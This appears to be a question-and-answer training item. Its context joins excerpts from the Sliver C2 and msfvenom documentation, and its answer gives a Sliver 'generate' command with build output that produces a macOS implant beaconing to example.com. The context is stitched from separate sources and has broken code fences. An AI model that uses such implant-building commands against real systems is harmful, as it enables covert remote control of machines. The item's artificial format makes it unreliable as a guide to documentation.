Context:Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:  
#### Basic Example  
```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
#### Setup  
Any `sliver-server` binary can be started as a builder process using [operator configuration files from multiplayer-mode](/docs?name=Multi-player+Mode) from the server you want to connect the builder to, for example:  
```
./sliver-server builder -c operator-multiplayer.cfg
To generate working payloads, you should have a complete comprehension of how things work. `transports`, `launchers`, `listeners` and `payloads` terms have to be understood before starting.
To generate a payload, there are two flags that you must supply (-p and -f):  
* **The -p flag: Specifies what payload to generate**  
To see what payloads are available from Framework, you can do:  
```
./msfvenom -l payloads

 Question: Provide a complete example of using the generate command in Sliver to create a payload. The example should include common parameters and the expected output. Respond with just a few command line. 
```
 Your response: 
```
sliver > generate --http example.com --os mac
[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```
